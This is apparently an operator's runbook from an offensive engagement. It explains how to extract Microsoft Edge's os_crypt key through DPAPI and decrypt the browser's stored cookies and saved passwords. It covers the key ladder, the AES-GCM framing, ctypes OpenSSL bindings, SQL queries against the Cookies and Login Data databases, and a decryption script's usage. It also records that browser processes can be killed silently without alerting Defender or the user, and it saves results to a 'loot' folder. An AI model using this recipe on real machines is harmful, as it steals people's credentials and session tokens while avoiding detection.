# Chromium os_crypt formats (Edge 155 tested)

Source: `scripts/decrypt-chromium.py` (byte-identical in `scripts/`), runbook
AGENTS.md §2, findings C12, HANDOFF.md §3.4 + §4.4.

## Key ladder (proven on Edge 155.0.4283.45)

1. `%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State` → JSON
   `os_crypt.encrypted_key` = base64( "DPAPI" prefix (5 B) + DPAPI blob ).
2. Strip the 5-byte `DPAPI` prefix; `.NET ProtectedData::Unprotect(...,
   'CurrentUser')` → 32-byte AES-256 key (works LIVE at medium integrity; no
   process stop needed). Session result saved as `loot\C12\Edge\aes_key.hex`
   (material operator-side; masked `75-D8-83-CE…` 32 B).

## Encrypted-value framing

| prefix | layout | status on Edge 155 |
|---|---|---|
| `v10` / `v11` | 3 B prefix ‖ 12 B nonce ‖ ciphertext ‖ 16 B GCM tag → AES-256-GCM with the os_crypt key | decryptable; EVP route session-proven (HANDOFF §3.4); this host's cookie store was 164/164 v20, saved passwords 0 rows |
| `v20` | app-bound; `Local State` key `APPB` = `"APPB"` + 4 B + DPAPI blob | NOT decryptable in-session: masterkey GUID `27b26861-f4eb-4cd6-912d-2e6f3c872fdf` referenced but ABSENT from `Protect\<SID>` → NTE_BAD_KEY |
| (none) | legacy DPAPI blob | decrypt with PowerShell CryptUnprotectData/ProtectedData |

## AES-GCM via OpenSSL EVP (ctypes) — the portable recipe

stdlib Python has NO AES. portablepy ships `libcrypto-3.dll` next to
`python.exe`; ctypes binds:

- `EVP_CIPHER_CTX_new` → ctx (c_void_p restype required!)
- `EVP_aes_256_gcm()` / `EVP_aes_128_gcm()` (fallback when key is 16 B)
- `EVP_DecryptInit_ex(ctx, cipher, None, None, None)` then
  `EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN=0x9, len(nonce), None)` then
  `EVP_DecryptInit_ex(ctx, None, None, key, nonce)`
- `EVP_DecryptUpdate(ctx, out, &outlen, ct, ctlen)`
- `EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_TAG=0x11, 16, tagbuf)` BEFORE
  `EVP_DecryptFinal_ex` — Final returning ≠1 means authentication failure
  (wrong key/nonce), treat as None, not as garbage plaintext.
- `EVP_CIPHER_CTX_free(ctx)` in a finally block.
- argtypes must be declared explicitly (c_void_p for all pointer slots) or the
  64-bit bindings silently corrupt.

## Database access

- Cookies DB (NEW layout): `Default\Network\Cookies` — NOT `Default\Cookies`.
  Edge locks it EXCLUSIVELY while running → copy-then-open; background-only
  msedge processes (0 windows) can be killed silently (proven: 7 kills, no
  Defender toasts, no user-visible effect).
- `decrypt-chromium.py` opens any copy read-only:
  `sqlite3.connect('file:<path>?mode=ro', uri=True)` — works even on locked
  originals for a consistent read attempt.
- Login Data transient `DirectoryNotFound` on copy → retry; path was valid.
- Schema used: cookies → `SELECT host_key, name, encrypted_value, path,
  expires_utc FROM cookies`; logins → `SELECT origin_url, username_value,
  password_value FROM logins`.

## Script I/O

```
python -X utf8 decrypt-chromium.py <db> <keyhex> <cookies|logins> [out.jsonl]
```
- keyhex = hex of the 32 B os_crypt key.
- Output: one JSON object per line (`host/name/value/path` or
  `url/username/password`), summary to stderr:
  `DECRYPTED=n DPAPI_OR_NOKEY=n V20=n TOTAL_FAIL=n` — the V20 count IS the
  finding (app-bound boundary), report it as such.
